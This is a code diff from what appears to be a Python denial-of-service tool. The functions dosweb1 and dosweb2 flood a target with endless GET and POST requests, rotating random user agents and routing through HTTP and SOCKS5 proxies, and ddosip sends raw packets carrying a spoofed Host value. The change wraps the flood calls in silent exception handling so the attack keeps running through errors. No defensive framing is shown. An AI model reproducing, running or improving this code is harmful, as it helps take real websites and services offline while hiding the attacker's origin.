@@ -39,18 +39,24 @@ def dosweb1(target):
             'http': f'socks5://{proxyagentsocks}',
             'https': f'socks5://{proxyagentsocks}'
         }
-        requests.get(target, headers=header, proxies=proxieshttp)
-        requests.post(target, headers=header, proxies=proxieshttp)
-        requests.get(target, headers=header2, proxies=proxiessocks)
-        requests.post(target, headers=header2, proxies=proxiessocks)
+        try:
+            requests.get(target, headers=header, proxies=proxieshttp)
+            requests.post(target, headers=header, proxies=proxieshttp)
+            requests.get(target, headers=header2, proxies=proxiessocks)
+            requests.post(target, headers=header2, proxies=proxiessocks)
+        except:
+            pass
 
 
 def dosweb2(target):
     while True:
         useragent = random.choice(headersp)
         header = {'user-agent': useragent}
-        requests.get(target, headers=header)
-        requests.post(target, headers=header)
+        try:
+            requests.get(target, headers=header)
+            requests.post(target, headers=header)
+        except:
+            pass
 
 
 def ddosip():
@@ -61,6 +67,7 @@ def ddosip():
         r.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
         r.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
         r.close()
+
 
 print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
 print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
